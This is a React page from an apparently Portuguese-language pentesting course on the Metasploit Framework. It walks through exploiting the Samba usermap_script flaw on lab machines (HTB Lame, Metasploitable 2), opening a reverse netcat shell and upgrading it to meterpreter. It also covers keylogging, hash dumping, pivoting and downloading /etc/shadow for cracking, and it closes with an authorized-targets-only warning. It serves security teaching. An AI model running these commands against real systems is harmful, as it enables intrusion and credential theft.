import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Metasploit() {
  return (
    <PageContainer
      title="Metasploit Framework — Exploração"
      subtitle="msfconsole, módulos exploit/auxiliary/post, payloads, sessions, meterpreter, db_*."
      difficulty="intermediário"
      timeToRead="25 min"
      prompt="exploit/metasploit"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo systemctl enable --now postgresql",
            out: "(necessário para o banco do msf)",
            outType: "muted",
          },
          {
            cmd: "sudo msfdb init",
            out: `[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf' and 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'`,
            outType: "success",
          },
          {
            cmd: "msfconsole -q",
            out: `msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

msf6 > version
Framework: 6.4.42-dev
Console  : 6.4.42-dev`,
            outType: "info",
          },
        ]}
      />

      <h2>Workspaces e DB</h2>
      <Terminal
        user="msf6"
        host=""
        path=""
        prompt=">"
        lines={[
          {
            cmd: "workspace -a htb_lame",
            out: "[*] Added workspace: htb_lame",
            outType: "muted",
          },
          {
            cmd: "workspace",
            out: `* htb_lame
  default`,
            outType: "default",
          },
          {
            comment: "importar saída de nmap (.xml) — popula hosts/services automaticamente",
            cmd: "db_import scan.xml",
            out: `[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.16.7'
[*] Importing host 10.10.10.5
[*] Successfully imported /home/wallyson/scan.xml`,
            outType: "info",
          },
          {
            cmd: "hosts",
            out: `Hosts
=====
address     mac                name           os_name        os_flavor   os_sp  purpose  info  comments
-------     ---                ----           -------        ---------   -----  -------  ----  --------
10.10.10.5  XX:XX:XX:XX:XX:XX  lame.htb       Linux          Ubuntu      8.04   server`,
            outType: "default",
          },
          {
            cmd: "services -p 22,445",
            out: `Services
========
host         port  proto  name         state  info
----         ----  -----  ----         -----  ----
10.10.10.5   22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1
10.10.10.5   445   tcp    smb          open   Samba 3.0.20-Debian (workgroup: WORKGROUP)`,
            outType: "info",
          },
        ]}
      />

      <h2>Buscar e usar módulos</h2>
      <Terminal
        user="msf6"
        host=""
        path=""
        prompt=">"
        lines={[
          {
            cmd: "search type:exploit name:samba",
            out: `Matching Modules
================

   #   Name                                                Disclosure  Rank       Check  Description
   -   ----                                                ----------  ----       -----  -----------
   0   exploit/multi/samba/usermap_script                  2007-05-14  excellent  No     Samba "username map script" Command Execution
   1   exploit/linux/samba/setinfopolicy_heap              2012-04-10  normal     No     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   2   exploit/linux/samba/is_known_pipename               2017-03-24  excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
[...]`,
            outType: "info",
          },
          {
            cmd: "use 0",
            out: "[*] Using exploit/multi/samba/usermap_script\nmsf6 exploit(multi/samba/usermap_script) >",
            outType: "muted",
          },
          {
            cmd: "info",
            out: `       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s)
  RPORT   139              yes       The target port (TCP)`,
            outType: "default",
          },
          {
            cmd: "options",
            out: `Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port`,
            outType: "default",
          },
        ]}
      />

      <h2>Configurar e rodar</h2>
      <Terminal
        user="msf6"
        host="exploit(multi/samba/usermap_script)"
        path=""
        prompt=">"
        lines={[
          {
            cmd: "set RHOSTS 10.10.10.5",
            out: "RHOSTS => 10.10.10.5",
            outType: "muted",
          },
          {
            cmd: "set LHOST tun0",
            out: "LHOST => 10.10.14.42",
            outType: "muted",
          },
          {
            cmd: "set LPORT 4444",
            out: "LPORT => 4444",
            outType: "muted",
          },
          {
            cmd: "show payloads",
            out: `Compatible Payloads
===================
   #  Name                                Description
   -  ----                                -----------
   0  cmd/unix/bind_awk                   Listen for connection
   1  cmd/unix/bind_netcat                Listen for connection
   2  cmd/unix/reverse                    Reverse shell using bash
   3  cmd/unix/reverse_awk                Reverse shell via awk
   4  cmd/unix/reverse_netcat             Reverse shell via netcat -e
   5  cmd/unix/reverse_perl               Reverse shell via perl`,
            outType: "default",
          },
          {
            cmd: "set payload cmd/unix/reverse_netcat",
            out: "payload => cmd/unix/reverse_netcat",
            outType: "muted",
          },
          {
            cmd: "check",
            out: "[*] 10.10.10.5:139 - The service is running, but could not be validated.",
            outType: "warning",
          },
          {
            cmd: "exploit",
            out: `[*] Started reverse TCP handler on 10.10.14.42:4444 
[*] 10.10.10.5:139 - Command shell session 1 opened (10.10.14.42:4444 -> 10.10.10.5:34567)

id
uid=0(root) gid=0(root)
hostname
lame`,
            outType: "success",
          },
        ]}
      />

      <h2>Sessions e meterpreter</h2>
      <Terminal
        user="msf6"
        host=""
        path=""
        prompt=">"
        lines={[
          {
            comment: "Ctrl+Z para enviar a session ao background",
            cmd: "background",
            out: `[*] Backgrounding session 1...
msf6 exploit(...) > `,
            outType: "default",
          },
          {
            cmd: "sessions",
            out: `Active sessions
===============

  Id  Name  Type        Information                            Connection
  --  ----  ----        -----------                            ----------
  1         shell unix  Shell Banner: Linux lame 2.6.24-16     10.10.14.42:4444 -> 10.10.10.5:34567 (10.10.10.5)`,
            outType: "info",
          },
          {
            comment: "upgrade shell para meterpreter",
            cmd: "sessions -u 1",
            out: `[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.42:4445 
[*] Sending stage (3045348 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.42:4445 -> 10.10.10.5:42178)`,
            outType: "success",
          },
          {
            cmd: "sessions -i 2",
            out: `[*] Starting interaction with 2...

meterpreter > `,
            outType: "info",
          },
        ]}
      />

      <CommandTable
        title="Comandos do meterpreter"
        variations={[
          { cmd: "sysinfo", desc: "Info do alvo (OS, arch, hostname).", output: "Computer: lame.htb\\nOS: Linux 2.6.24-16\\nArch: x86" },
          { cmd: "getuid", desc: "Quem você é no alvo.", output: "Server username: root" },
          { cmd: "ps", desc: "Lista processos.", output: "Tabela com PID, name, user, path." },
          { cmd: "migrate <PID>", desc: "Migra para outro processo (estabilidade).", output: "Útil para sair de um IE32 para um lsass." },
          { cmd: "shell", desc: "Drop para shell nativa do alvo.", output: "/bin/bash ou cmd.exe" },
          { cmd: "upload arquivo /tmp/", desc: "Envia arquivo do Kali → alvo.", output: "Para colocar binários (linpeas, mimikatz)." },
          { cmd: "download /etc/shadow .", desc: "Baixa arquivo do alvo → Kali.", output: "Para análise local." },
          { cmd: "search -f flag.txt", desc: "Procura arquivo.", output: "Recursivo no FS do alvo." },
          { cmd: "screenshot", desc: "Print da tela (se gráfico).", output: "Salva em ~/.msf4/loot/" },
          { cmd: "keyscan_start / dump / stop", desc: "Keylogger.", output: "Captura tudo digitado." },
          { cmd: "hashdump", desc: "SAM hashes (Windows).", output: "user:RID:LM:NTLM:::" },
          { cmd: "getsystem", desc: "Tenta escalar para SYSTEM (Windows).", output: "Tenta vários métodos automaticamente." },
          { cmd: "portfwd add -l 8080 -p 80 -r 192.168.10.5", desc: "Pivoting: porta 8080 local → 80 interno.", output: "Acessar redes internas." },
          { cmd: "route add 192.168.10.0/24 1", desc: "Roteia tráfego do msf por essa session.", output: "Para usar outros módulos pelo pivot." },
        ]}
      />

      <h2>Módulos auxiliary (scanners)</h2>
      <Terminal
        user="msf6"
        host=""
        path=""
        prompt=">"
        lines={[
          {
            cmd: "use auxiliary/scanner/smb/smb_version",
            out: "msf6 auxiliary(scanner/smb/smb_version) >",
            outType: "muted",
          },
          {
            cmd: "set RHOSTS 192.168.1.0/24; run",
            out: `[+] 192.168.1.5:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (signatures:required) (uptime:23 days) (guid:{abc123})
[+] 192.168.1.50:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (signatures:required)
[+] 192.168.1.108:445     - SMB Detected (versions:1) (preferred dialect:SMB 1.0) (signatures:disabled) (uptime:1 days)  ← VULN!`,
            outType: "warning",
          },
          {
            cmd: "use auxiliary/scanner/portscan/tcp",
            out: "msf6 auxiliary(scanner/portscan/tcp) >",
            outType: "muted",
          },
          {
            cmd: "set RHOSTS 192.168.1.50; set PORTS 1-1000; run",
            out: `[+] 192.168.1.50:           - 22 - TCP OPEN
[+] 192.168.1.50:           - 80 - TCP OPEN
[+] 192.168.1.50:           - 443 - TCP OPEN
[*] Auxiliary module execution completed`,
            outType: "info",
          },
        ]}
      />

      <h2>Resource files (automação)</h2>
      <CodeBlock
        language="bash"
        title="auto.rc — script reproduzível"
        code={`workspace -a auto_lab
db_import /home/wallyson/scan.xml

use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.5
set LHOST tun0
set LPORT 4444
set payload cmd/unix/reverse_netcat
exploit -j -z

# rodar em background, não interagir`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfconsole -q -r auto.rc",
            out: `[*] Processing auto.rc for ERB directives.
[*] resource (auto.rc)> workspace -a auto_lab
[*] Added workspace: auto_lab
[*] resource (auto.rc)> db_import /home/wallyson/scan.xml
[*] Importing 'Nmap XML' data
[*] resource (auto.rc)> exploit -j -z
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.42:4444 
[*] Command shell session 1 opened`,
            outType: "success",
          },
        ]}
      />

      <h2>Pivoting básico</h2>
      <Terminal
        user="meterpreter"
        host=""
        path=""
        prompt=">"
        lines={[
          {
            comment: "ALVO está em 192.168.50.10 (rede interna). Você só vê o pivot 10.10.10.5",
            cmd: "run autoroute -s 192.168.50.0/24",
            out: `[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[*] Adding a route to 192.168.50.0/255.255.255.0...
[+] Added route to 192.168.50.0/255.255.255.0 via 10.10.10.5
[*] Use the -p option to list all active routes`,
            outType: "info",
          },
          {
            cmd: "background",
            out: "[*] Backgrounding session 2...",
            outType: "muted",
          },
          {
            cmd: "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.50.10; set PORTS 22,80,445; run",
            out: `[+] 192.168.50.10:           - 22 - TCP OPEN
[+] 192.168.50.10:           - 445 - TCP OPEN
(scan saiu pelo session 2 → vê a rede interna)`,
            outType: "success",
          },
        ]}
      />

      <h2>Loot e logs</h2>
      <Terminal
        user="msf6"
        host=""
        path=""
        prompt=">"
        lines={[
          {
            cmd: "loot",
            out: `Loot
====
host         service  type           name           content      info        path
----         -------  ----           ----           -------      ----        ----
10.10.10.5            unix.passwd    passwd_data    text/plain   Linux       /home/wallyson/.msf4/loot/20260403131221_default_10.10.10.5_unix.passwd_982341.txt
10.10.10.5            unix.shadow    shadow_data    text/plain   Linux hashes /home/wallyson/.msf4/loot/20260403131223_default_10.10.10.5_unix.shadow_141232.txt`,
            outType: "info",
          },
          {
            cmd: "creds",
            out: `Credentials
===========
host         origin       service     public  private    realm  private_type  JtR Format
----         ------       -------     ------  -------    -----  ------------  ----------
10.10.10.5   10.10.10.5   445/tcp     admin   admin      ACME   Password      
10.10.10.5   10.10.10.5   445/tcp     root    $1$ABC...         NTLM hash     md5crypt`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Pwn no Metasploitable 2"
        goal="Sequência completa: scan → import → exploit Samba → meterpreter → loot."
        steps={[
          "Suba Metasploitable 2 em VM (host-only).",
          "Faça nmap full + xml e importe no msfconsole.",
          "Use exploit/multi/samba/usermap_script.",
          "Upgrade para meterpreter.",
          "Dump /etc/shadow para loot.",
        ]}
        command={`# 1) scan
sudo nmap -sS -sV -A -p- 192.168.56.101 -oX msf2.xml

# 2) msf
msfconsole -q -x "
workspace -a msf2;
db_import msf2.xml;
use exploit/multi/samba/usermap_script;
set RHOSTS 192.168.56.101;
set LHOST tun0;
set payload cmd/unix/reverse_netcat;
exploit -z"

# já com session aberta, no msf:
sessions -u 1
sessions -i 2
download /etc/shadow .`}
        expected={`[*] Started reverse TCP handler on 10.10.14.42:4444
[*] Command shell session 1 opened
[+] Meterpreter session 2 opened
meterpreter > getuid
Server username: root
meterpreter > download /etc/shadow .
[*] Downloading: /etc/shadow → ./shadow
[*] Downloaded 1245 bytes`}
        verify="O arquivo ./shadow local deve ter hashes começando em $1$ ou $6$. Use john/hashcat para crackear (ver páginas dedicadas)."
      />

      <AlertBox type="danger" title="Use só em alvo autorizado">
        Cada exploit do msf é uma intrusão. Use apenas em VMs próprias, plataformas (HTB/THM)
        ou alvos com autorização escrita. Em produção, qualquer rodada de exploit sem
        contrato é crime.
      </AlertBox>
    </PageContainer>
  );
}
